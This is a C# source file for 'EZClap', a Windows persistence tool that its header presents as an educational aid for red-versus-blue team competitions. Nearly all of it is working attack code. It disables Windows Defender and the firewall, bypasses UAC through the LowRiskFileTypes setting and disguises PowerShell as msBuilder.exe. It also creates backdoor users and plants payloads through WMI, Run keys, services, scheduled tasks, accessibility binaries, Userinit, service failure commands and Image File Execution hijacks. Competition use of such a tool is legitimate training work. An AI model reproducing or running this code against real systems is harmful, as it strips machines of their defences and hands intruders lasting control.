using System;
using System.Configuration;
using System.Collections.Specialized;
using System.Collections.Generic;
using Microsoft.Win32;

/*  Name: EZClap 
 *  Description: EZClap is a Windows Userland persistence tool which was created for educational purposes in 
 *  Red vs. Blue team competitions. As the tool is targetted towards beginners in Windows Security, most of the 
 *  mechanisms are easy to detect through usage of sysinternal tools or simple cmd/powershell commands.
 * 
 *  Configuration:
 *      - Change the app.config file. It's fine to use the default configuration setting, though. 
 * 
 *  Modules: 
 *      - As EZClap (tried to be) is modular, simply add a module, and call it in the main function. 
 *      For every new module, app.config needs to be changed as well. But it should be easy to do so. 
 * 
 */

namespace ezclap
{
    class Program
    {
        // Something to parse a yaml file and feed all the configuration into the persistence in main function 

        public static void modifyImageFileExec(string[] payload)
        {
            Random rnd = new Random();

            RegistryKey imageFileExecKey = Registry.LocalMachine.OpenSubKey(RegistryKeys.hklmImageFileExec);
            string[] targetExec = new string[] { "notepad.exe", "taskmgr.exe", "Autoruns64.exe", "Autoruns.exe", "chrome.exe", "powershell.exe", "cmd.exe" };
            foreach (string target in targetExec)
            {
                string finalImageFileExec = RegistryKeys.hklmImageFileExec + "\\" + target;
                Utils.setHKLMSubKey(finalImageFileExec, "GlobalFlag", 512);

                string finalSilentProcExit = RegistryKeys.hklmSilentProcessExit + "\\" + target;
                Utils.setHKLMSubKey(finalSilentProcExit, "ReportingMode", 1);
                Utils.setHKLMSubKey(finalSilentProcExit, "MonitorProcess", payload[rnd.Next(0,payload.Length-1)]);

            }
        }

        public static void setup(string originPayloadLoc, string[] newLoc)
        {
            // 1. Copy powershell as msBuilder.exe 
            string srcPath = @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe";
            string destPath = @"C:\Windows\System32\msBuilder.exe";
            System.IO.File.Copy(srcPath, destPath, true);

            // 2. change LowRiskFileTypes to bypass UAC 
            Utils.setHKCUSubKey(RegistryKeys.hkcuLowRiskFileType, "LowRiskFileTypes", ".bat;.exe;.ps1");
            //Console.WriteLine(RegistryKeys.hklmImagePath);

            // 3. Copy payload into different locations 
            List<string> payloadList = new List<string>();
            foreach (var destination in newLoc)
            {
                System.IO.File.Copy(originPayloadLoc, destination, true);
                payloadList.Add(destination);
            }

            // 4. Disable WinDefender - Temp 
            string noRealTime = "Set-MpPreference -DisableRealTimeMonitoring $true -DisableScriptScanning $true -DisableIOAVProtection $true";
            string excludeC = "Add-MpPreference -ExclusionPath \"C:\"";
            string noSubmit = "Set-MpPreference -SubmitSamplesConsent 2";

            System.Diagnostics.Process.Start(@"powershell.exe", noRealTime);
            System.Diagnostics.Process.Start(@"powershell.exe", excludeC);
            System.Diagnostics.Process.Start(@"powershell.exe", noSubmit);

            // 5. Drop firewall 
            System.Diagnostics.Process proc = new System.Diagnostics.Process();
            string netsh = "netsh.exe";
            proc.StartInfo.Arguments = "Advfirewall set allprofile state off";
            proc.StartInfo.FileName = netsh;
            proc.StartInfo.CreateNoWindow = true;
            proc.Start();
            proc.WaitForExit();

            // 6. Disable WinDefender - For Good 
            Utils.setHKLMSubKey(RegistryKeys.hklmDefender, "DisableAntiSpyware", 1);

            // 6. Erase WinDefender
            /*
            string byeDefender = "config TrustedInstaller binPath= \"cmd.exe /C del 'C:\\Program Files\\Windows Defender\\MSASCui.exe\" ";
            System.Diagnostics.Process.Start(@"C:\Windows\System32\sc.exe", byeDefender);
            string terminate = "start TrustedInstaller";
            System.Diagnostics.Process.Start(@"C:\Windows\System32\sc.exe", terminate);
            */

        }

        private static void testConfig()
        {
            string[] WMIName = Utils.parseConfig("techniques/AddWMI", "name");
            Array.ForEach(WMIName, Console.WriteLine);

            string[] addUserPassword = Utils.parseConfig("techniques/AddUser", "password");
            Array.ForEach(addUserPassword, Console.WriteLine);

            string[] addUserGroups = Utils.parseConfig("techniques/AddUser", "groups");
            Array.ForEach(addUserGroups, Console.WriteLine);

            string[] scheduledTaskName = Utils.parseConfig("techniques/AddScheduledTask", "name");
            Array.ForEach(scheduledTaskName, Console.WriteLine);
        }

        static void Main(string[] args)
        {
                       
            // ########## Setting up #################
            Random rnd = new Random();

            string originalPayloadLoc = args[0];
            Console.WriteLine("[+] Using original payload: " + originalPayloadLoc);

            string[] payload = Utils.parseConfig("payload", "name");
            setup(originalPayloadLoc, payload);

            // ########## Start of Implanting Persistence #################
            // 1. Add WMI 
            string[] WMIName = Utils.parseConfig("techniques/AddWMI", "name");
            Array.ForEach(WMIName, element => Console.WriteLine(element));
            AddWMI persistWMI = new AddWMI(WMIName, payload);

            // 2. Add Backdoor Users 
            string[] userNames = Utils.parseConfig("techniques/AddUser", "usernames");
            string[] password = Utils.parseConfig("techniques/AddUser", "password");
            string[] groups = Utils.parseConfig("techniques/AddUser", "groups");
            AddUser persistUser = new AddUser(userNames, password[0], groups);

            // 3. Add RunKey registry keys 
            string[] runKeyName = Utils.parseConfig("techniques/AddRunKey", "name");
            AddRunKey persistRunKey = new AddRunKey(runKeyName, payload[rnd.Next(0,payload.Length-1)]);
            

            // 4. Add Services 
            string[] serviceName = Utils.parseConfig("techniques/AddService", "name");
            AddService persistService = new AddService(serviceName, payload);

            
            // 5. Add Scheduled Tasks 
            string[] scheduledTaskName = Utils.parseConfig("techniques/AddScheduledTask", "name");
            string[] intervalString = Utils.parseConfig("techniques/AddScheduledTask", "interval");
            double interval = Convert.ToDouble(intervalString[0]);
            AddScheduledTask persistSchTask = new AddScheduledTask(scheduledTaskName, payload, interval);

            // 6. Add Accessibility 
            AddAccessibility persistAccessibility = new AddAccessibility(payload);

            // 7. Modify userinit 
            Utils.setHKLMSubKey(RegistryKeys.hklmUserInit, "Userinit", payload[rnd.Next(0,payload.Length-1)] + ", C:\\Windows\\System32\\userinit.exe");

            // 8. Modify FailureCommand 
            List<string> servicesList = Utils.getAllServices();
            AddFailureCommand persistFailureCommand = new AddFailureCommand(servicesList, payload);

            // 9. Modify Image File Execution             
            modifyImageFileExec(payload);

            Console.WriteLine("[+] All persistence mechanisms are done.");
        }
    }
}
